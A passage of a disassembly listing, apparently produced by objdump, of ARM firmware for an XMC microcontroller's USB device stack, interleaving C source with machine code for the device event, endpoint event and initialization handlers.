 8004000:	ddab      	ble.n	8003f5a <USBD_SignalDeviceEventHandler+0x62>
			}
		}
		device.Configuration = 0;
 8004002:	4b43      	ldr	r3, [pc, #268]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004004:	2200      	movs	r2, #0
 8004006:	f883 2139 	strb.w	r2, [r3, #313]	; 0x139
		for (i=0;i<NUM_INTERFACES;i++) {
 800400a:	2300      	movs	r3, #0
 800400c:	60fb      	str	r3, [r7, #12]
 800400e:	e009      	b.n	8004024 <USBD_SignalDeviceEventHandler+0x12c>
			device.InterfaceSettings[i] = 0;
 8004010:	4a3f      	ldr	r2, [pc, #252]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004012:	68fb      	ldr	r3, [r7, #12]
 8004014:	4413      	add	r3, r2
 8004016:	f503 739c 	add.w	r3, r3, #312	; 0x138
 800401a:	2200      	movs	r2, #0
 800401c:	701a      	strb	r2, [r3, #0]
		for (i=0;i<NUM_INTERFACES;i++) {
 800401e:	68fb      	ldr	r3, [r7, #12]
 8004020:	3301      	adds	r3, #1
 8004022:	60fb      	str	r3, [r7, #12]
 8004024:	68fb      	ldr	r3, [r7, #12]
 8004026:	2b00      	cmp	r3, #0
 8004028:	ddf2      	ble.n	8004010 <USBD_SignalDeviceEventHandler+0x118>
		}
		device.Driver->EndpointReadStart(device.Endpoints[0].Address,24);
 800402a:	4b39      	ldr	r3, [pc, #228]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 800402c:	681b      	ldr	r3, [r3, #0]
 800402e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004030:	4a37      	ldr	r2, [pc, #220]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004032:	7912      	ldrb	r2, [r2, #4]
 8004034:	2118      	movs	r1, #24
 8004036:	4610      	mov	r0, r2
 8004038:	4798      	blx	r3
		break;
 800403a:	e064      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_SOF:
		EVENT_USB_Device_StartOfFrame();
 800403c:	f002 f8fc 	bl	8006238 <USB_Event_Stub>
		break;
 8004040:	e061      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_CONNECT:
		EVENT_USB_Device_Connect();
 8004042:	f7fc fd4e 	bl	8000ae2 <EVENT_USB_Device_Connect>
		break;
 8004046:	e05e      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_DISCONNECT:
		USB_DeviceState = DEVICE_STATE_Powered;
 8004048:	4b30      	ldr	r3, [pc, #192]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 800404a:	2201      	movs	r2, #1
 800404c:	701a      	strb	r2, [r3, #0]
		EVENT_USB_Device_Disconnect();
 800404e:	f002 f8f3 	bl	8006238 <USB_Event_Stub>
		break;
 8004052:	e058      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_POWER_OFF:
		 USB_DeviceState = DEVICE_STATE_Unattached;
 8004054:	4b2d      	ldr	r3, [pc, #180]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 8004056:	2200      	movs	r2, #0
 8004058:	701a      	strb	r2, [r3, #0]
		 device.Driver->EndpointUnconfigure(0);
 800405a:	4b2d      	ldr	r3, [pc, #180]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 800405c:	681b      	ldr	r3, [r3, #0]
 800405e:	6a1b      	ldr	r3, [r3, #32]
 8004060:	2000      	movs	r0, #0
 8004062:	4798      	blx	r3
		 break;
 8004064:	e04f      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
    case XMC_USBD_EVENT_POWER_ON:
		 USB_DeviceState = DEVICE_STATE_Powered;
 8004066:	4b29      	ldr	r3, [pc, #164]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 8004068:	2201      	movs	r2, #1
 800406a:	701a      	strb	r2, [r3, #0]
		 memset(&device,0x0,sizeof(USB_Device_t));
 800406c:	f44f 72a0 	mov.w	r2, #320	; 0x140
 8004070:	2100      	movs	r1, #0
 8004072:	4827      	ldr	r0, [pc, #156]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004074:	f002 fbf6 	bl	8006864 <memset>
		 device.Driver = &Driver_USBD0;
 8004078:	4b25      	ldr	r3, [pc, #148]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 800407a:	4a26      	ldr	r2, [pc, #152]	; (8004114 <USBD_SignalDeviceEventHandler+0x21c>)
 800407c:	601a      	str	r2, [r3, #0]
		 device.EP0_State = IDLE;
 800407e:	4b24      	ldr	r3, [pc, #144]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004080:	2201      	movs	r2, #1
 8004082:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
		 device.Endpoints[0].InBuffer = endpoint0_in_buffer;
 8004086:	4b22      	ldr	r3, [pc, #136]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004088:	4a23      	ldr	r2, [pc, #140]	; (8004118 <USBD_SignalDeviceEventHandler+0x220>)
 800408a:	621a      	str	r2, [r3, #32]
		 device.Endpoints[0].InBufferLength = 256;
 800408c:	4b20      	ldr	r3, [pc, #128]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 800408e:	f44f 7280 	mov.w	r2, #256	; 0x100
 8004092:	625a      	str	r2, [r3, #36]	; 0x24
		 device.Endpoints[0].OutBuffer = endpoint0_out_buffer;
 8004094:	4b1e      	ldr	r3, [pc, #120]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8004096:	4a21      	ldr	r2, [pc, #132]	; (800411c <USBD_SignalDeviceEventHandler+0x224>)
 8004098:	615a      	str	r2, [r3, #20]
		 device.Endpoints[0].OutBufferLength = 256;
 800409a:	4b1d      	ldr	r3, [pc, #116]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 800409c:	f44f 7280 	mov.w	r2, #256	; 0x100
 80040a0:	619a      	str	r2, [r3, #24]
		 device.Endpoints[0].Direction = 0;
 80040a2:	4a1b      	ldr	r2, [pc, #108]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040a4:	7913      	ldrb	r3, [r2, #4]
 80040a6:	f36f 13c7 	bfc	r3, #7, #1
 80040aa:	7113      	strb	r3, [r2, #4]
		 device.Endpoints[0].IsConfigured = 1;
 80040ac:	4a18      	ldr	r2, [pc, #96]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040ae:	7a13      	ldrb	r3, [r2, #8]
 80040b0:	f043 0301 	orr.w	r3, r3, #1
 80040b4:	7213      	strb	r3, [r2, #8]
		 device.Endpoints[0].IsEnabled = 1;
 80040b6:	4a16      	ldr	r2, [pc, #88]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040b8:	7a13      	ldrb	r3, [r2, #8]
 80040ba:	f043 0302 	orr.w	r3, r3, #2
 80040be:	7213      	strb	r3, [r2, #8]
		 device.Endpoints[0].MaxPacketSize = 64;
 80040c0:	4a13      	ldr	r2, [pc, #76]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040c2:	8913      	ldrh	r3, [r2, #8]
 80040c4:	2140      	movs	r1, #64	; 0x40
 80040c6:	f361 138c 	bfi	r3, r1, #6, #7
 80040ca:	8113      	strh	r3, [r2, #8]

		  /* then configure endpoint 0 */
		 device.Driver->EndpointConfigure(0,XMC_USBD_ENDPOINT_TYPE_CONTROL,
 80040cc:	4b10      	ldr	r3, [pc, #64]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040ce:	681b      	ldr	r3, [r3, #0]
 80040d0:	69db      	ldr	r3, [r3, #28]
 80040d2:	2240      	movs	r2, #64	; 0x40
 80040d4:	2100      	movs	r1, #0
 80040d6:	2000      	movs	r0, #0
 80040d8:	4798      	blx	r3
					   (uint8_t)XMC_USBD_MAX_PACKET_SIZE);

		break;
 80040da:	e014      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_REMOTE_WAKEUP:
		break;
	case XMC_USBD_EVENT_RESUME:
		USB_DeviceState = device.PreSuspendDeviceState;
 80040dc:	4b0c      	ldr	r3, [pc, #48]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040de:	f893 213a 	ldrb.w	r2, [r3, #314]	; 0x13a
 80040e2:	4b0a      	ldr	r3, [pc, #40]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 80040e4:	701a      	strb	r2, [r3, #0]
		EVENT_USB_Device_WakeUp();
 80040e6:	f002 f8a7 	bl	8006238 <USB_Event_Stub>
		break;
 80040ea:	e00c      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	case XMC_USBD_EVENT_SUSPEND:
		device.PreSuspendDeviceState = USB_DeviceState;
 80040ec:	4b07      	ldr	r3, [pc, #28]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 80040ee:	781b      	ldrb	r3, [r3, #0]
 80040f0:	b2da      	uxtb	r2, r3
 80040f2:	4b07      	ldr	r3, [pc, #28]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 80040f4:	f883 213a 	strb.w	r2, [r3, #314]	; 0x13a
		USB_DeviceState = DEVICE_STATE_Suspended;
 80040f8:	4b04      	ldr	r3, [pc, #16]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 80040fa:	2205      	movs	r2, #5
 80040fc:	701a      	strb	r2, [r3, #0]
		EVENT_USB_Device_Suspend();
 80040fe:	f002 f89b 	bl	8006238 <USB_Event_Stub>
		break;
 8004102:	e000      	b.n	8004106 <USBD_SignalDeviceEventHandler+0x20e>
	default:
		return;
 8004104:	bf00      	nop
	}
}
 8004106:	3710      	adds	r7, #16
 8004108:	46bd      	mov	sp, r7
 800410a:	bd80      	pop	{r7, pc}
 800410c:	20000c9c 	.word	0x20000c9c
 8004110:	2000070c 	.word	0x2000070c
 8004114:	08006a3c 	.word	0x08006a3c
 8004118:	2000084c 	.word	0x2000084c
 800411c:	2000094c 	.word	0x2000094c

08004120 <USBD_SignalEndpointEvent_Handler>:
 *
 * \param[in] ep_addr Endpoint address
 * \param[in] ep_event Endpoint event type
 *
 */
void USBD_SignalEndpointEvent_Handler (uint8_t ep_addr, XMC_USBD_EP_EVENT_t ep_event) {
 8004120:	b580      	push	{r7, lr}
 8004122:	b086      	sub	sp, #24
 8004124:	af00      	add	r7, sp, #0
 8004126:	4603      	mov	r3, r0
 8004128:	460a      	mov	r2, r1
 800412a:	71fb      	strb	r3, [r7, #7]
 800412c:	4613      	mov	r3, r2
 800412e:	71bb      	strb	r3, [r7, #6]
	USBD_Endpoint_t *ep =  &device.Endpoints[ep_addr & ENDPOINT_EPNUM_MASK];
 8004130:	79fb      	ldrb	r3, [r7, #7]
 8004132:	f003 030f 	and.w	r3, r3, #15
 8004136:	222c      	movs	r2, #44	; 0x2c
 8004138:	fb02 f303 	mul.w	r3, r2, r3
 800413c:	4a5e      	ldr	r2, [pc, #376]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 800413e:	4413      	add	r3, r2
 8004140:	3304      	adds	r3, #4
 8004142:	617b      	str	r3, [r7, #20]
	uint8_t temp_num,temp_dir;
	int32_t data_count;
	/* store CurrentEndpoint and direction for restore after handling */
	temp_num = device.CurrentEndpoint;
 8004144:	4b5c      	ldr	r3, [pc, #368]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 8004146:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 800414a:	74fb      	strb	r3, [r7, #19]
	temp_dir = device.CurrentDirection;
 800414c:	4b5a      	ldr	r3, [pc, #360]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 800414e:	f893 313d 	ldrb.w	r3, [r3, #317]	; 0x13d
 8004152:	74bb      	strb	r3, [r7, #18]
	/* select the given endpoint */
	device.CurrentEndpoint = ep_addr & ENDPOINT_EPNUM_MASK;
 8004154:	79fb      	ldrb	r3, [r7, #7]
 8004156:	f003 030f 	and.w	r3, r3, #15
 800415a:	b2da      	uxtb	r2, r3
 800415c:	4b56      	ldr	r3, [pc, #344]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 800415e:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
	device.CurrentDirection = ep_addr & ENDPOINT_DIR_MASK;
 8004162:	79fb      	ldrb	r3, [r7, #7]
 8004164:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8004168:	b2da      	uxtb	r2, r3
 800416a:	4b53      	ldr	r3, [pc, #332]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 800416c:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	/* choose what to do based on the event */
	switch (ep_event) {
 8004170:	79bb      	ldrb	r3, [r7, #6]
 8004172:	2b02      	cmp	r3, #2
 8004174:	d03f      	beq.n	80041f6 <USBD_SignalEndpointEvent_Handler+0xd6>
 8004176:	2b02      	cmp	r3, #2
 8004178:	f300 8093 	bgt.w	80042a2 <USBD_SignalEndpointEvent_Handler+0x182>
 800417c:	2b00      	cmp	r3, #0
 800417e:	d002      	beq.n	8004186 <USBD_SignalEndpointEvent_Handler+0x66>
 8004180:	2b01      	cmp	r3, #1
 8004182:	d00f      	beq.n	80041a4 <USBD_SignalEndpointEvent_Handler+0x84>
 8004184:	e08d      	b.n	80042a2 <USBD_SignalEndpointEvent_Handler+0x182>
	case XMC_USBD_EP_EVENT_SETUP:
		ep->OutInUse = 0;
 8004186:	697a      	ldr	r2, [r7, #20]
 8004188:	8893      	ldrh	r3, [r2, #4]
 800418a:	f36f 03c3 	bfc	r3, #3, #1
 800418e:	8093      	strh	r3, [r2, #4]
		switch(device.CurrentEndpoint) {
 8004190:	4b49      	ldr	r3, [pc, #292]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 8004192:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8004196:	2b00      	cmp	r3, #0
 8004198:	d102      	bne.n	80041a0 <USBD_SignalEndpointEvent_Handler+0x80>
		case 0:
			USBD_HandleEP0_SETUP();
 800419a:	f7ff fe63 	bl	8003e64 <USBD_HandleEP0_SETUP>
			break;
 800419e:	e000      	b.n	80041a2 <USBD_SignalEndpointEvent_Handler+0x82>
		default:
			break;
 80041a0:	bf00      	nop
		}
		break;
 80041a2:	e07e      	b.n	80042a2 <USBD_SignalEndpointEvent_Handler+0x182>
	case XMC_USBD_EP_EVENT_OUT:
		ep->IsOutRecieved = 1;
 80041a4:	697a      	ldr	r2, [r7, #20]
 80041a6:	8893      	ldrh	r3, [r2, #4]
 80041a8:	f043 0320 	orr.w	r3, r3, #32
 80041ac:	8093      	strh	r3, [r2, #4]
		if (ep->OutBytesAvailable == 0) {
 80041ae:	697b      	ldr	r3, [r7, #20]
 80041b0:	689b      	ldr	r3, [r3, #8]
 80041b2:	2b00      	cmp	r3, #0
 80041b4:	d110      	bne.n	80041d8 <USBD_SignalEndpointEvent_Handler+0xb8>
			ep->OutOffset = 0; /* clear offset, new data is there */
 80041b6:	697b      	ldr	r3, [r7, #20]
 80041b8:	2200      	movs	r2, #0
 80041ba:	60da      	str	r2, [r3, #12]
			ep->OutBytesAvailable = device.Driver->EndpointRead(ep->Address,ep->OutBuffer,ep->OutBufferLength);
 80041bc:	4b3e      	ldr	r3, [pc, #248]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 80041be:	681b      	ldr	r3, [r3, #0]
 80041c0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80041c2:	697a      	ldr	r2, [r7, #20]
 80041c4:	7810      	ldrb	r0, [r2, #0]
 80041c6:	697a      	ldr	r2, [r7, #20]
 80041c8:	6911      	ldr	r1, [r2, #16]
 80041ca:	697a      	ldr	r2, [r7, #20]
 80041cc:	6952      	ldr	r2, [r2, #20]
 80041ce:	4798      	blx	r3
 80041d0:	4603      	mov	r3, r0
 80041d2:	461a      	mov	r2, r3
 80041d4:	697b      	ldr	r3, [r7, #20]
 80041d6:	609a      	str	r2, [r3, #8]
		}
		ep->OutInUse = 0;
 80041d8:	697a      	ldr	r2, [r7, #20]
 80041da:	8893      	ldrh	r3, [r2, #4]
 80041dc:	f36f 03c3 	bfc	r3, #3, #1
 80041e0:	8093      	strh	r3, [r2, #4]
		switch(device.CurrentEndpoint) {
 80041e2:	4b35      	ldr	r3, [pc, #212]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 80041e4:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80041e8:	2b00      	cmp	r3, #0
 80041ea:	d102      	bne.n	80041f2 <USBD_SignalEndpointEvent_Handler+0xd2>
		case 0:
			USBD_HandleEP0_OUT();
 80041ec:	f7ff fe10 	bl	8003e10 <USBD_HandleEP0_OUT>
			break;
 80041f0:	e000      	b.n	80041f4 <USBD_SignalEndpointEvent_Handler+0xd4>
		default:
			break;
 80041f2:	bf00      	nop
		}
		break;
 80041f4:	e055      	b.n	80042a2 <USBD_SignalEndpointEvent_Handler+0x182>
	case XMC_USBD_EP_EVENT_IN:
		/* loop write transfers */
		if (ep->InDataLeft> 0) {
 80041f6:	697b      	ldr	r3, [r7, #20]
 80041f8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80041fa:	2b00      	cmp	r3, #0
 80041fc:	d017      	beq.n	800422e <USBD_SignalEndpointEvent_Handler+0x10e>
			data_count = device.Driver->EndpointWrite(ep->Address,ep->InDataBuffer,ep->InDataLeft);
 80041fe:	4b2e      	ldr	r3, [pc, #184]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 8004200:	681b      	ldr	r3, [r3, #0]
 8004202:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004204:	697a      	ldr	r2, [r7, #20]
 8004206:	7810      	ldrb	r0, [r2, #0]
 8004208:	697a      	ldr	r2, [r7, #20]
 800420a:	6a91      	ldr	r1, [r2, #40]	; 0x28
 800420c:	697a      	ldr	r2, [r7, #20]
 800420e:	6a52      	ldr	r2, [r2, #36]	; 0x24
 8004210:	4798      	blx	r3
 8004212:	60f8      	str	r0, [r7, #12]
			ep->InDataLeft -= data_count;
 8004214:	697b      	ldr	r3, [r7, #20]
 8004216:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004218:	68fb      	ldr	r3, [r7, #12]
 800421a:	1ad2      	subs	r2, r2, r3
 800421c:	697b      	ldr	r3, [r7, #20]
 800421e:	625a      	str	r2, [r3, #36]	; 0x24
			ep->InDataBuffer+= data_count;
 8004220:	697b      	ldr	r3, [r7, #20]
 8004222:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8004224:	68fb      	ldr	r3, [r7, #12]
 8004226:	441a      	add	r2, r3
 8004228:	697b      	ldr	r3, [r7, #20]
 800422a:	629a      	str	r2, [r3, #40]	; 0x28
			return;
 800422c:	e041      	b.n	80042b2 <USBD_SignalEndpointEvent_Handler+0x192>
		} else if (ep->Number == 0 && ep->InBytesAvailable > 0 && ep->InBytesAvailable!=USB_ControlRequest.wLength && ep->InBytesAvailable % ep->MaxPacketSize == 0) {
 800422e:	697b      	ldr	r3, [r7, #20]
 8004230:	781b      	ldrb	r3, [r3, #0]
 8004232:	f003 030f 	and.w	r3, r3, #15
 8004236:	b2db      	uxtb	r3, r3
 8004238:	2b00      	cmp	r3, #0
 800423a:	d120      	bne.n	800427e <USBD_SignalEndpointEvent_Handler+0x15e>
 800423c:	697b      	ldr	r3, [r7, #20]
 800423e:	699b      	ldr	r3, [r3, #24]
 8004240:	2b00      	cmp	r3, #0
 8004242:	d01c      	beq.n	800427e <USBD_SignalEndpointEvent_Handler+0x15e>
 8004244:	697b      	ldr	r3, [r7, #20]
 8004246:	699b      	ldr	r3, [r3, #24]
 8004248:	4a1c      	ldr	r2, [pc, #112]	; (80042bc <USBD_SignalEndpointEvent_Handler+0x19c>)
 800424a:	88d2      	ldrh	r2, [r2, #6]
 800424c:	b292      	uxth	r2, r2
 800424e:	4293      	cmp	r3, r2
 8004250:	d015      	beq.n	800427e <USBD_SignalEndpointEvent_Handler+0x15e>
 8004252:	697b      	ldr	r3, [r7, #20]
 8004254:	699b      	ldr	r3, [r3, #24]
 8004256:	697a      	ldr	r2, [r7, #20]
 8004258:	8892      	ldrh	r2, [r2, #4]
 800425a:	f3c2 1286 	ubfx	r2, r2, #6, #7
 800425e:	b2d2      	uxtb	r2, r2
 8004260:	fbb3 f1f2 	udiv	r1, r3, r2
 8004264:	fb01 f202 	mul.w	r2, r1, r2
 8004268:	1a9b      	subs	r3, r3, r2
 800426a:	2b00      	cmp	r3, #0
 800426c:	d107      	bne.n	800427e <USBD_SignalEndpointEvent_Handler+0x15e>
			/* if the amount of data for endpoint 0 is exact the requested amount, then no zlp has to be send */
			device.Driver->EndpointWrite(ep->Address,0,0);
 800426e:	4b12      	ldr	r3, [pc, #72]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 8004270:	681b      	ldr	r3, [r3, #0]
 8004272:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004274:	697a      	ldr	r2, [r7, #20]
 8004276:	7810      	ldrb	r0, [r2, #0]
 8004278:	2200      	movs	r2, #0
 800427a:	2100      	movs	r1, #0
 800427c:	4798      	blx	r3
		}
		ep->InBytesAvailable = 0;
 800427e:	697b      	ldr	r3, [r7, #20]
 8004280:	2200      	movs	r2, #0
 8004282:	619a      	str	r2, [r3, #24]
		ep->InInUse = 0;
 8004284:	697a      	ldr	r2, [r7, #20]
 8004286:	8893      	ldrh	r3, [r2, #4]
 8004288:	f36f 1304 	bfc	r3, #4, #1
 800428c:	8093      	strh	r3, [r2, #4]
		switch(device.CurrentEndpoint) {
 800428e:	4b0a      	ldr	r3, [pc, #40]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 8004290:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8004294:	2b00      	cmp	r3, #0
 8004296:	d102      	bne.n	800429e <USBD_SignalEndpointEvent_Handler+0x17e>
		case 0:
			USBD_HandleEP0_IN();
 8004298:	f7ff fd94 	bl	8003dc4 <USBD_HandleEP0_IN>
			break;
 800429c:	e000      	b.n	80042a0 <USBD_SignalEndpointEvent_Handler+0x180>
		default:
			break;
 800429e:	bf00      	nop
		}
		break;
 80042a0:	bf00      	nop
	}
	device.CurrentEndpoint = temp_num;
 80042a2:	4a05      	ldr	r2, [pc, #20]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 80042a4:	7cfb      	ldrb	r3, [r7, #19]
 80042a6:	f882 313c 	strb.w	r3, [r2, #316]	; 0x13c
	device.CurrentDirection = temp_dir;
 80042aa:	4a03      	ldr	r2, [pc, #12]	; (80042b8 <USBD_SignalEndpointEvent_Handler+0x198>)
 80042ac:	7cbb      	ldrb	r3, [r7, #18]
 80042ae:	f882 313d 	strb.w	r3, [r2, #317]	; 0x13d
}
 80042b2:	3718      	adds	r7, #24
 80042b4:	46bd      	mov	sp, r7
 80042b6:	bd80      	pop	{r7, pc}
 80042b8:	2000070c 	.word	0x2000070c
 80042bc:	20000c94 	.word	0x20000c94

080042c0 <USBD_Initialize>:
 * \brief Initialize driver core and driver
 *
 * Intializes the USB driver core data structures and sets it into default state. Afterwards
 * it initializes the USB device controller driver and prepare it for connection via \ref USBD_Connect.
 */
int USBD_Initialize(XMC_USBD_t *usb_init) {
 80042c0:	b580      	push	{r7, lr}
 80042c2:	b084      	sub	sp, #16
 80042c4:	af00      	add	r7, sp, #0
 80042c6:	6078      	str	r0, [r7, #4]
	int32_t status = 0;
 80042c8:	2300      	movs	r3, #0
 80042ca:	60fb      	str	r3, [r7, #12]
	memset(&device,0x0,sizeof(USB_Device_t));
 80042cc:	f44f 72a0 	mov.w	r2, #320	; 0x140
 80042d0:	2100      	movs	r1, #0
 80042d2:	4829      	ldr	r0, [pc, #164]	; (8004378 <USBD_Initialize+0xb8>)
 80042d4:	f002 fac6 	bl	8006864 <memset>
	USB_DeviceState = DEVICE_STATE_Unattached;
 80042d8:	4b28      	ldr	r3, [pc, #160]	; (800437c <USBD_Initialize+0xbc>)
 80042da:	2200      	movs	r2, #0
 80042dc:	701a      	strb	r2, [r3, #0]
	device.Driver = &Driver_USBD0;
 80042de:	4b26      	ldr	r3, [pc, #152]	; (8004378 <USBD_Initialize+0xb8>)
 80042e0:	4a27      	ldr	r2, [pc, #156]	; (8004380 <USBD_Initialize+0xc0>)
 80042e2:	601a      	str	r2, [r3, #0]
	device.EP0_State = IDLE;
 80042e4:	4b24      	ldr	r3, [pc, #144]	; (8004378 <USBD_Initialize+0xb8>)
 80042e6:	2201      	movs	r2, #1
 80042e8:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	device.Endpoints[0].InBuffer = endpoint0_in_buffer;
 80042ec:	4b22      	ldr	r3, [pc, #136]	; (8004378 <USBD_Initialize+0xb8>)
 80042ee:	4a25      	ldr	r2, [pc, #148]	; (8004384 <USBD_Initialize+0xc4>)
 80042f0:	621a      	str	r2, [r3, #32]
	device.Endpoints[0].InBufferLength = 256;
 80042f2:	4b21      	ldr	r3, [pc, #132]	; (8004378 <USBD_Initialize+0xb8>)
 80042f4:	f44f 7280 	mov.w	r2, #256	; 0x100
 80042f8:	625a      	str	r2, [r3, #36]	; 0x24
	device.Endpoints[0].OutBuffer = endpoint0_out_buffer;
 80042fa:	4b1f      	ldr	r3, [pc, #124]	; (8004378 <USBD_Initialize+0xb8>)
 80042fc:	4a22      	ldr	r2, [pc, #136]	; (8004388 <USBD_Initialize+0xc8>)
 80042fe:	615a      	str	r2, [r3, #20]
	device.Endpoints[0].OutBufferLength = 256;
 8004300:	4b1d      	ldr	r3, [pc, #116]	; (8004378 <USBD_Initialize+0xb8>)
 8004302:	f44f 7280 	mov.w	r2, #256	; 0x100
 8004306:	619a      	str	r2, [r3, #24]
	device.Endpoints[0].Direction = 0;
 8004308:	4a1b      	ldr	r2, [pc, #108]	; (8004378 <USBD_Initialize+0xb8>)
 800430a:	7913      	ldrb	r3, [r2, #4]
 800430c:	f36f 13c7 	bfc	r3, #7, #1
 8004310:	7113      	strb	r3, [r2, #4]
	device.Endpoints[0].IsConfigured = 1;
 8004312:	4a19      	ldr	r2, [pc, #100]	; (8004378 <USBD_Initialize+0xb8>)
 8004314:	7a13      	ldrb	r3, [r2, #8]
 8004316:	f043 0301 	orr.w	r3, r3, #1
 800431a:	7213      	strb	r3, [r2, #8]
	device.Endpoints[0].IsEnabled = 1;
 800431c:	4a16      	ldr	r2, [pc, #88]	; (8004378 <USBD_Initialize+0xb8>)
 800431e:	7a13      	ldrb	r3, [r2, #8]
 8004320:	f043 0302 	orr.w	r3, r3, #2
 8004324:	7213      	strb	r3, [r2, #8]
	device.Endpoints[0].MaxPacketSize = 64;
 8004326:	4a14      	ldr	r2, [pc, #80]	; (8004378 <USBD_Initialize+0xb8>)
 8004328:	8913      	ldrh	r3, [r2, #8]
 800432a:	2140      	movs	r1, #64	; 0x40
 800432c:	f361 138c 	bfi	r3, r1, #6, #7
 8004330:	8113      	strh	r3, [r2, #8]

	/* First initalize the device */
	status = device.Driver->Initialize(usb_init);
 8004332:	4b11      	ldr	r3, [pc, #68]	; (8004378 <USBD_Initialize+0xb8>)
 8004334:	681b      	ldr	r3, [r3, #0]
 8004336:	685b      	ldr	r3, [r3, #4]
 8004338:	6878      	ldr	r0, [r7, #4]
 800433a:	4798      	blx	r3
 800433c:	4603      	mov	r3, r0
 800433e:	60fb      	str	r3, [r7, #12]
	if (status != XMC_USBD_STATUS_OK)
 8004340:	68fb      	ldr	r3, [r7, #12]
 8004342:	2b00      	cmp	r3, #0
 8004344:	d002      	beq.n	800434c <USBD_Initialize+0x8c>
		return -1;
 8004346:	f04f 33ff 	mov.w	r3, #4294967295	; 0xffffffff
 800434a:	e011      	b.n	8004370 <USBD_Initialize+0xb0>

	/* then configure endpoint 0 */
	device.Driver->EndpointConfigure(0,XMC_USBD_ENDPOINT_TYPE_CONTROL,
 800434c:	4b0a      	ldr	r3, [pc, #40]	; (8004378 <USBD_Initialize+0xb8>)
 800434e:	681b      	ldr	r3, [r3, #0]
 8004350:	69db      	ldr	r3, [r3, #28]
 8004352:	2240      	movs	r2, #64	; 0x40
 8004354:	2100      	movs	r1, #0
 8004356:	2000      	movs	r0, #0
 8004358:	4798      	blx	r3
			(uint8_t)XMC_USBD_MAX_PACKET_SIZE);
	if (status != XMC_USBD_STATUS_OK) {
 800435a:	68fb      	ldr	r3, [r7, #12]
 800435c:	2b00      	cmp	r3, #0
 800435e:	d006      	beq.n	800436e <USBD_Initialize+0xae>
		device.Driver->Uninitialize();
 8004360:	4b05      	ldr	r3, [pc, #20]	; (8004378 <USBD_Initialize+0xb8>)
 8004362:	681b      	ldr	r3, [r3, #0]
 8004364:	689b      	ldr	r3, [r3, #8]
 8004366:	4798      	blx	r3
		return -1;
 8004368:	f04f 33ff 	mov.w	r3, #4294967295	; 0xffffffff
 800436c:	e000      	b.n	8004370 <USBD_Initialize+0xb0>
	}

	return 0;
 800436e:	2300      	movs	r3, #0
}
 8004370:	4618      	mov	r0, r3
 8004372:	3710      	adds	r7, #16
 8004374:	46bd      	mov	sp, r7
 8004376:	bd80      	pop	{r7, pc}
 8004378:	2000070c 	.word	0x2000070c
 800437c:	20000c9c 	.word	0x20000c9c
 8004380:	08006a3c 	.word	0x08006a3c
 8004384:	2000084c 	.word	0x2000084c
 8004388:	2000094c 	.word	0x2000094c

0800438c <USB_IsEnumDone>:
/**
 * \brief Is the enumeration finished?
 *
 * Tell the USB device controller driver if the enumeration interrupt have been reached
 */
int USB_IsEnumDone(void){
 800438c:	b580      	push	{r7, lr}
